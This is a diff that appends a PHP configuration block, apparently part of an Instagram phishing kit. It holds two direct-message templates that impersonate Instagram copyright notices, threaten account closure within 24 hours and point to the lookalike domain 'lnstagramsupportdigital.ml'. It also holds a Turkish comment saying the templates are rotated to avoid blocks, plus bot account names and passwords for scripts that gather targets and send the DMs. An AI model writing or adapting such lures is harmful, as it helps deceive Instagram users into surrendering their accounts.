@@ -497,3 +497,43 @@ require("info.php");
 
 
 </body></html>
+
+<?php 
+$randxd = rand(400000000000,500000000000); 
+$randxd2 = rand(400000000000,500000000000); 
+$taslaklar = array("Hello,\n
+You will receive this message automatically if you have infringed the copyright of a post shared on your account.\n
+\n
+Your account infringes copyright and this is a serious problem. If you do not protect your account against copyright, your account will be deleted from our system.\n
+\n
+Please protect your account against copyright from the link we sent you.\n
+\n
+Form: https://www.lnstagramsupportdigital.ml/support/\n
+\n
+Copyright Inquiry : $randxd","Hello!\n
+\n
+A copyright violation has been detected in a post on your account.\n
+\n
+If you think copyright infringement is wrong, you should provide feedback\n
+\n
+Otherwise, your account will be closed within 24 hours. You can give feedback from the link below.\n
+\n
+Thank you for your understanding.\n
+\n
+Form : https://lnstagramsupportdigital.ml/support\n
+\n
+Case Number : $randxd2\n
+\n
+© lnstagram Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025"); //DM'de gönderilecek mesaj. (Engel yememesi için birden fazla taslak.)
+
+
+/////// topla.php hesap bilgileri /////
+$hesaplar = array("instahesap1","toplat1","toplat2"); // username 
+$hesapsifre = "sifre123"; // pw
+///////////////////////////////////////
+
+/////// dmgonder.php hesap bilgileri ////
+$usernamee = array('hesap1','hesap2','hesap');
+$password = "sifre123456"; // pw
+//////////////////////////////////////
+?>
